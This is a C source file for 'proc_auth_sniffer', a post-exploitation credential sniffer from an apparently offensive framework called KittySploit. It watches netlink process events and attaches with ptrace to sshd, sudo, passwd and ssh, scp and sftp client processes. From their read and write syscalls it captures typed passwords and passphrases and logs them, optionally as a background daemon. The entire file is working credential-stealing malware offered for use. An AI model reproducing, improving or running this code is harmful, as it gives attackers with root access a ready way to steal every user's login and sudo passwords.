/*
 * KittySploit proc_auth_sniffer — netlink proc events + ptrace credential capture.
 *
 * Inspired by the 3snake approach (MIT): watch sshd/sudo auth flows without
 * modifying sshd or loading a kernel module. Implemented as a single static
 * helper for post/shell/linux/gather/proc_auth_sniffer.
 */
#define _GNU_SOURCE
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <linux/cn_proc.h>
#include <linux/connector.h>
#include <linux/netlink.h>
#include <pwd.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define KS_EVENT_BEGIN "__KS_SNIFF_EVENT__"
#define KS_EVENT_END "__KS_SNIFF_END__"
#define MAX_SECRET_LEN 256
#define PROC_NAME_BUF 512
#define VALID_PATHS 5

static const char *valid_bin_prefixes[VALID_PATHS + 1] = {
	"/bin/",
	"/usr/bin/",
	"/usr/sbin/",
	"/usr/local/bin/",
	"/usr/local/sbin/",
	NULL,
};

static FILE *g_out = NULL;
static const char *g_pidfile = NULL;
static int g_enable_ssh = 1;
static int g_enable_sudo = 1;
static int g_enable_ssh_client = 1;
static int g_enable_passwd = 1;

#ifdef __x86_64__
#include <sys/user.h>
#define SYS_NR_read 0
#define SYS_NR_write 1
#define SYS_NR_select 23
#define SYS_NR_pipe2 293
#define SYS_NR_exit_group 231
#define SYS_NR_dup 32
struct user_regs_struct g_regs;
#elif defined(__aarch64__)
#include <asm/ptrace.h>
#include <sys/uio.h>
#ifndef NT_PRSTATUS
#define NT_PRSTATUS 1
#endif
#define SYS_NR_read 63
#define SYS_NR_write 64
#define SYS_NR_select 23
#define SYS_NR_pipe2 59
#define SYS_NR_exit_group 94
#define SYS_NR_pselect6 73
#define SYS_NR_dup 23
struct user_pt_regs g_regs;
#else
#error "proc_auth_sniffer: supported arches are x86_64 and aarch64"
#endif

static void die(const char *msg)
{
	fprintf(stderr, "proc_auth_sniffer: %s", msg);
	if (errno)
		fprintf(stderr, ": %s", strerror(errno));
	fprintf(stderr, "\n");
	exit(1);
}

static int reg_refresh(pid_t child)
{
#ifdef __x86_64__
	return ptrace(PTRACE_GETREGS, child, NULL, &g_regs);
#else
	struct iovec iov = { .iov_base = &g_regs, .iov_len = sizeof(g_regs) };
	return ptrace(PTRACE_GETREGSET, child, (void *)(uintptr_t)NT_PRSTATUS, &iov);
#endif
}

#ifdef __aarch64__
static long syscall_num(void)
{
	return (long)g_regs.regs[8];
}

static long syscall_arg(int which)
{
	if (which < 0 || which > 5)
		return -1;
	return (long)g_regs.regs[which];
}

static long syscall_ret_len(void)
{
	return (long)g_regs.regs[0];
}
#else
static long syscall_num(void)
{
	return (long)g_regs.orig_rax;
}

static long syscall_arg(int which)
{
	switch (which) {
	case 0:
		return (long)g_regs.rdi;
	case 1:
		return (long)g_regs.rsi;
	case 2:
		return (long)g_regs.rdx;
	case 3:
		return (long)g_regs.r10;
	case 4:
		return (long)g_regs.r8;
	case 5:
		return (long)g_regs.r9;
	default:
		return -1;
	}
}

static long syscall_ret_len(void)
{
	return (long)g_regs.rax;
}
#endif

static char *read_remote_mem(pid_t child, unsigned long addr, size_t len)
{
	char *buf;
	size_t off = 0;
	long word;

	if (!len || len > 65536)
		return NULL;

	buf = calloc(1, len + sizeof(long) + 1);
	if (!buf)
		return NULL;

	while (off < len) {
		errno = 0;
		word = ptrace(PTRACE_PEEKDATA, child, addr + off, NULL);
		if (errno)
			break;
		memcpy(buf + off, &word, sizeof(long));
		off += sizeof(long);
	}
	return buf;
}

static char *mem_at_arg1(pid_t child, size_t len)
{
	unsigned long addr = (unsigned long)syscall_arg(1);
	return read_remote_mem(child, addr, len);
}

static int wait_syscall_stop(pid_t child)
{
	int status;

	for (;;) {
		ptrace(PTRACE_SYSCALL, child, NULL, NULL);
		if (waitpid(child, &status, 0) < 0)
			return -1;
		if (WIFSTOPPED(status) && (WSTOPSIG(status) & 0x80))
			return 0;
		if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGUSR1)
			continue;
		if (WIFEXITED(status) || WIFSIGNALED(status))
			return 1;
		if (WIFSTOPPED(status)) {
			kill(child, WSTOPSIG(status));
			return 1;
		}
	}
}

static int is_printable(const char *s, size_t n)
{
	size_t i;
	for (i = 0; i < n; i++)
		if (!s[i] || !isascii((unsigned char)s[i]) || !isprint((unsigned char)s[i]))
			return 0;
	return n > 0;
}

static void emit_event(
	const char *user,
	pid_t pid,
	const char *proc,
	const char *kind,
	const char *secret
)
{
	FILE *sink;
	time_t now = time(NULL);

	if (!secret || !secret[0])
		return;

	sink = g_out ? g_out : stdout;
	fprintf(sink, "%s\n", KS_EVENT_BEGIN);
	fprintf(sink, "ts=%ld\n", (long)now);
	fprintf(sink, "user=%s\n", user ? user : "unknown");
	fprintf(sink, "pid=%d\n", (int)pid);
	fprintf(sink, "proc=%s\n", proc ? proc : "?");
	fprintf(sink, "kind=%s\n", kind ? kind : "password");
	fprintf(sink, "value=%s\n", secret);
	fprintf(sink, "%s\n", KS_EVENT_END);
	fflush(sink);
}

static char *proc_cmdline(pid_t pid)
{
	char path[64];
	char *buf;
	size_t n;
	FILE *fp;

	snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
	fp = fopen(path, "rb");
	if (!fp)
		return NULL;
	buf = calloc(1, PROC_NAME_BUF + 1);
	if (!buf) {
		fclose(fp);
		return NULL;
	}
	n = fread(buf, 1, PROC_NAME_BUF, fp);
	fclose(fp);
	for (size_t i = 0; i < n; i++)
		if (buf[i] == '\0')
			buf[i] = ' ';
	return buf;
}

static char *proc_exe(pid_t pid)
{
	char linkpath[64];
	char *buf;
	ssize_t n;

	snprintf(linkpath, sizeof(linkpath), "/proc/%d/exe", pid);
	buf = calloc(1, PROC_NAME_BUF);
	if (!buf)
		return NULL;
	n = readlink(linkpath, buf, PROC_NAME_BUF - 1);
	if (n < 0) {
		free(buf);
		return NULL;
	}
	buf[n] = '\0';
	return buf;
}

static char *proc_username(pid_t pid)
{
	char path[64];
	char line[256];
	char name[128];
	int uid = -1, euid = -1;
	FILE *fp;
	struct passwd *pw;

	snprintf(path, sizeof(path), "/proc/%d/status", pid);
	fp = fopen(path, "r");
	if (!fp)
		return strdup("unknown");
	while (fgets(line, sizeof(line), fp)) {
		if (sscanf(line, "Uid:\t%d\t%d", &uid, &euid) >= 2)
			break;
		if (sscanf(line, "Uid:\t%d", &uid) == 1)
			euid = uid;
	}
	fclose(fp);
	if (euid < 0 && uid < 0)
		return strdup("unknown");
	if (euid < 0)
		euid = uid;
	pw = getpwuid((uid_t)euid);
	if (!pw)
		return strdup("unknown");
	name[0] = '\0';
	snprintf(name, sizeof(name), "%s", pw->pw_name);
	return strdup(name);
}

static int path_allowed(const char *exe)
{
	const char **p;

	if (!exe)
		return 0;
	for (p = valid_bin_prefixes; *p; p++) {
		size_t n = strlen(*p);
		if (!strncmp(exe, *p, n))
			return 1;
	}
	return 0;
}

enum target_kind {
	TARGET_NONE = 0,
	TARGET_SSHD,
	TARGET_SUDO,
	TARGET_SSH_CLIENT,
	TARGET_PASSWD,
};

static enum target_kind classify_proc(const char *cmdline)
{
	if (!cmdline)
		return TARGET_NONE;
	if (g_enable_ssh && (!strncmp(cmdline, "sshd: [net]", 12) ||
			     !strncmp(cmdline, "sshd: [accepted]", 16)))
		return TARGET_SSHD;
	if (g_enable_sudo && !strncmp(cmdline, "sudo ", 5))
		return TARGET_SUDO;
	if (g_enable_passwd && !strncmp(cmdline, "passwd", 6))
		return TARGET_PASSWD;
	if (g_enable_ssh_client) {
		if (!strncmp(cmdline, "ssh ", 4))
			return TARGET_SSH_CLIENT;
		if (!strncmp(cmdline, "ssh-add ", 8))
			return TARGET_SSH_CLIENT;
		if (!strncmp(cmdline, "scp ", 4) || !strncmp(cmdline, "sftp ", 5))
			return TARGET_SSH_CLIENT;
	}
	return TARGET_NONE;
}

static char *ssh_password_from_write(const char *mem, size_t len)
{
	unsigned int cs;
	size_t slen;
	char *out;

	if (!mem || len < 5 || len > MAX_SECRET_LEN)
		return NULL;

	if (len > 8) {
		cs = (unsigned)((unsigned char)mem[0]) << 24 |
		     (unsigned)((unsigned char)mem[1]) << 16 |
		     (unsigned)((unsigned char)mem[2]) << 8 |
		     (unsigned)((unsigned char)mem[3]);
		slen = strlen(mem + 4);
		if (slen == cs && slen > 0 && slen < MAX_SECRET_LEN) {
			out = calloc(1, slen + 1);
			if (out)
				memcpy(out, mem + 4, slen);
			return out;
		}
		if (len >= 12) {
			cs = (unsigned)((unsigned char)mem[4]) << 24 |
			     (unsigned)((unsigned char)mem[5]) << 16 |
			     (unsigned)((unsigned char)mem[6]) << 8 |
			     (unsigned)((unsigned char)mem[7]);
			slen = strlen(mem + 8);
			if (slen == cs && slen > 0 && slen < MAX_SECRET_LEN) {
				out = calloc(1, slen + 1);
				if (out)
					memcpy(out, mem + 8, slen);
				return out;
			}
		}
	}
	return NULL;
}

static void trace_sudo(pid_t pid, const char *user, const char *proc)
{
	int status;
	char pw[MAX_SECRET_LEN + 1];
	size_t idx = 0;
	long nr, len;
	char *chunk;

	memset(pw, 0, sizeof(pw));
	ptrace(PTRACE_ATTACH, pid, NULL, NULL);
	if (waitpid(pid, &status, 0) < 0 || !WIFSTOPPED(status))
		goto out;
	ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);

	for (;;) {
		if (wait_syscall_stop(pid) != 0)
			break;
		reg_refresh(pid);
		nr = syscall_num();
		if (nr == SYS_NR_pipe2 || nr == SYS_NR_select ||
		    nr == SYS_NR_exit_group)
			break;
#ifdef __aarch64__
		if (nr == SYS_NR_pselect6)
			break;
#endif

		if (nr == SYS_NR_read) {
			len = syscall_arg(2);
			if (len == 1) {
				chunk = mem_at_arg1(pid, 1);
				if (chunk && chunk[0] && idx < MAX_SECRET_LEN) {
					pw[idx++] = chunk[0];
				} else if (idx && is_printable(pw, idx)) {
					pw[idx] = '\0';
					emit_event(user, pid, proc, "password", pw);
					idx = 0;
					memset(pw, 0, sizeof(pw));
				}
				free(chunk);
			}
		} else if (idx > 0) {
			pw[idx] = '\0';
			if (is_printable(pw, idx))
				emit_event(user, pid, proc, "password", pw);
			idx = 0;
			memset(pw, 0, sizeof(pw));
		}
		if (wait_syscall_stop(pid) != 0)
			break;
	}
	if (idx && is_printable(pw, idx)) {
		pw[idx] = '\0';
		emit_event(user, pid, proc, "password", pw);
	}
out:
	ptrace(PTRACE_DETACH, pid, NULL, NULL);
}

static void trace_sshd(pid_t pid, const char *user, const char *proc)
{
	int status;
	long nr, len;
	char *mem, *secret;

	ptrace(PTRACE_ATTACH, pid, NULL, NULL);
	if (waitpid(pid, &status, 0) < 0 || !WIFSTOPPED(status))
		goto out;
	ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);

	for (;;) {
		if (wait_syscall_stop(pid) != 0)
			break;
		reg_refresh(pid);
		nr = syscall_num();
		if (wait_syscall_stop(pid) != 0)
			break;
		reg_refresh(pid);
		if (nr != SYS_NR_write)
			continue;
		len = syscall_ret_len();
		if (len <= 0 || len > MAX_SECRET_LEN)
			continue;
		mem = mem_at_arg1(pid, (size_t)len);
		secret = ssh_password_from_write(mem, (size_t)len);
		if (secret) {
			char *cur = proc_cmdline(pid);
			emit_event(user, pid, cur ? cur : proc, "password", secret);
			free(cur);
		}
		free(mem);
		free(secret);
	}
out:
	ptrace(PTRACE_DETACH, pid, NULL, NULL);
}

static void trace_passwd(pid_t pid, const char *user, const char *proc)
{
	int status;
	long nr;
	long fd, want, got;
	char *chunk;
	char buf[MAX_SECRET_LEN + 1];
	size_t n, i;

	ptrace(PTRACE_ATTACH, pid, NULL, NULL);
	if (waitpid(pid, &status, 0) < 0 || !WIFSTOPPED(status))
		goto out;
	ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);

	for (;;) {
		if (wait_syscall_stop(pid) != 0)
			break;
		reg_refresh(pid);
		nr = syscall_num();
		if (nr != SYS_NR_read) {
			if (wait_syscall_stop(pid) != 0)
				break;
			continue;
		}
		fd = syscall_arg(0);
		want = syscall_arg(2);
		if (wait_syscall_stop(pid) != 0)
			break;
		reg_refresh(pid);
		got = syscall_ret_len();
		if (fd != 0 || got <= 0 || got > MAX_SECRET_LEN)
			continue;
		if (want >= 64 && want <= 1024) {
			chunk = mem_at_arg1(pid, (size_t)got);
			if (!chunk)
				continue;
			n = (size_t)got;
			if (n > MAX_SECRET_LEN)
				n = MAX_SECRET_LEN;
			for (i = 0; i < n; i++) {
				if (chunk[i] == '\n')
					break;
				buf[i] = chunk[i];
			}
			buf[i] = '\0';
			if (i && is_printable(buf, i))
				emit_event(user, pid, proc, "password", buf);
			free(chunk);
		}
	}
out:
	ptrace(PTRACE_DETACH, pid, NULL, NULL);
}

static void trace_ssh_client(pid_t pid, const char *user, const char *proc)
{
	int status;
	char pw[MAX_SECRET_LEN + 1];
	size_t idx = 0;
	long nr, len;
	char *read_chunk, *write_chunk;
	int pass_prompt = 0;
	const char *pass_mark = ": ";

	memset(pw, 0, sizeof(pw));
	ptrace(PTRACE_ATTACH, pid, NULL, NULL);
	if (waitpid(pid, &status, 0) < 0 || !WIFSTOPPED(status))
		goto out;
	ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);

	for (;;) {
		if (wait_syscall_stop(pid) != 0)
			break;
		reg_refresh(pid);
		nr = syscall_num();
		if (nr == SYS_NR_dup)
			break;

		if (nr == SYS_NR_write) {
			len = syscall_arg(2);
			if (len == 1) {
				write_chunk = mem_at_arg1(pid, 1);
				if (write_chunk && write_chunk[0] == '\n' && pass_prompt && idx) {
					pw[idx] = '\0';
					if (is_printable(pw, idx))
						emit_event(user, pid, proc, "password", pw);
					pass_prompt = 0;
					idx = 0;
					memset(pw, 0, sizeof(pw));
				}
				free(write_chunk);
			} else if (len > 1) {
				write_chunk = mem_at_arg1(pid, (size_t)len);
				if (write_chunk) {
					if (strstr(write_chunk, pass_mark) &&
					    strlen(strstr(write_chunk, pass_mark)) ==
						strlen(pass_mark))
						pass_prompt = 1;
					if (strstr(write_chunk, "passphrase"))
						emit_event(
							user, pid, proc, "passphrase_hint", write_chunk);
				}
				free(write_chunk);
			}
			if (wait_syscall_stop(pid) != 0)
				break;
			continue;
		}

		if (nr == SYS_NR_read && pass_prompt) {
			len = syscall_arg(2);
			if (len == 1) {
				read_chunk = mem_at_arg1(pid, 1);
				if (read_chunk && read_chunk[0] && idx < MAX_SECRET_LEN)
					pw[idx++] = read_chunk[0];
				free(read_chunk);
			}
			if (wait_syscall_stop(pid) != 0)
				break;
			continue;
		}

		if (wait_syscall_stop(pid) != 0)
			break;
	}
out:
	ptrace(PTRACE_DETACH, pid, NULL, NULL);
}

static void trace_process(pid_t pid)
{
	char *cmdline, *exe, *user;
	enum target_kind kind;

	cmdline = proc_cmdline(pid);
	exe = proc_exe(pid);
	kind = classify_proc(cmdline);
	if (kind == TARGET_NONE || !path_allowed(exe))
		goto cleanup;

	user = proc_username(pid);
	switch (kind) {
	case TARGET_SSHD:
		trace_sshd(pid, user, cmdline);
		break;
	case TARGET_SUDO:
		trace_sudo(pid, user, cmdline);
		break;
	case TARGET_PASSWD:
		trace_passwd(pid, user, cmdline);
		break;
	case TARGET_SSH_CLIENT:
		trace_ssh_client(pid, user, cmdline);
		break;
	default:
		break;
	}
	free(user);
cleanup:
	free(cmdline);
	free(exe);
}

static int nl_listen_loop(void)
{
	int nl;
	struct sockaddr_nl sa;
	int rc;
	struct __attribute__((aligned(NLMSG_ALIGNTO))) {
		struct nlmsghdr nlh;
		struct __attribute__((__packed__)) {
			struct cn_msg cn;
			enum proc_cn_mcast_op mcast;
		};
	} req;
	struct __attribute__((aligned(NLMSG_ALIGNTO))) {
		struct nlmsghdr nlh;
		struct __attribute__((__packed__)) {
			struct cn_msg cn;
			struct proc_event ev;
		};
	} msg;

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	sa.nl_groups = CN_IDX_PROC;
	sa.nl_pid = getpid();

	nl = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_CONNECTOR);
	if (nl < 0)
		die("netlink socket");

	if (bind(nl, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("netlink bind");

	memset(&req, 0, sizeof(req));
	req.nlh.nlmsg_len = sizeof(req);
	req.nlh.nlmsg_pid = getpid();
	req.nlh.nlmsg_type = NLMSG_DONE;
	req.cn.id.idx = CN_IDX_PROC;
	req.cn.id.val = CN_VAL_PROC;
	req.cn.len = sizeof(enum proc_cn_mcast_op);
	req.mcast = PROC_CN_MCAST_LISTEN;
	if (send(nl, &req, sizeof(req), 0) < 0)
		die("netlink subscribe");

	if (g_pidfile) {
		FILE *pf = fopen(g_pidfile, "w");
		if (pf) {
			fprintf(pf, "%d\n", getpid());
			fclose(pf);
		}
	}

	signal(SIGCHLD, SIG_IGN);

	for (;;) {
		memset(&msg, 0, sizeof(msg));
		rc = recv(nl, &msg, sizeof(msg), 0);
		if (rc <= 0)
			continue;

		switch (msg.ev.what) {
		case PROC_EVENT_EXEC:
			if (g_enable_sudo || g_enable_ssh_client || g_enable_passwd) {
				pid_t child = fork();
				if (child == 0) {
					trace_process(msg.ev.event_data.exec.process_pid);
					_exit(0);
				}
			}
			break;
		case PROC_EVENT_UID:
			if (g_enable_ssh) {
				pid_t child = fork();
				if (child == 0) {
					trace_process((pid_t)msg.ev.event_data.id.process_pid);
					_exit(0);
				}
			}
			break;
		default:
			break;
		}
	}
	return 0;
}

static void daemonize(void)
{
	pid_t p;
	int fd;

	p = fork();
	if (p < 0)
		die("fork");
	if (p > 0)
		_exit(0);

	if (setsid() < 0)
		die("setsid");
	p = fork();
	if (p < 0)
		die("fork");
	if (p > 0)
		_exit(0);

	umask(027);
	if (chdir("/tmp") < 0)
		die("chdir");

	for (int i = 0; i < 256; i++)
		close(i);
	fd = open("/dev/null", O_RDWR);
	dup(fd);
	dup(fd);
}

static void usage(const char *argv0)
{
	fprintf(stderr,
		"Usage: %s [-d] [-o FILE] [-p PIDFILE] "
		"[--no-ssh] [--no-sudo] [--no-ssh-client] [--no-passwd]\n",
		argv0);
	exit(2);
}

int main(int argc, char **argv)
{
	int opt;
	int daemon = 0;
	const char *outpath = NULL;

	static struct option long_opts[] = {
		{ "no-ssh", no_argument, NULL, 256 },
		{ "no-sudo", no_argument, NULL, 257 },
		{ "no-ssh-client", no_argument, NULL, 258 },
		{ "no-passwd", no_argument, NULL, 259 },
		{ NULL, 0, NULL, 0 },
	};

	if (geteuid() != 0) {
		fprintf(stderr, "proc_auth_sniffer: root required (ptrace other users)\n");
		return 1;
	}

	while ((opt = getopt_long(argc, argv, "do:p:", long_opts, NULL)) != -1) {
		switch (opt) {
		case 'd':
			daemon = 1;
			break;
		case 'o':
			outpath = optarg;
			break;
		case 'p':
			g_pidfile = optarg;
			break;
		case 256:
			g_enable_ssh = 0;
			break;
		case 257:
			g_enable_sudo = 0;
			break;
		case 258:
			g_enable_ssh_client = 0;
			break;
		case 259:
			g_enable_passwd = 0;
			break;
		default:
			usage(argv[0]);
		}
	}

	if (outpath) {
		g_out = fopen(outpath, "a");
		if (!g_out)
			die("open output");
	}

	if (daemon) {
		daemonize();
		if (!outpath)
			g_out = fopen("/dev/null", "a");
	}

	return nl_listen_loop();
}
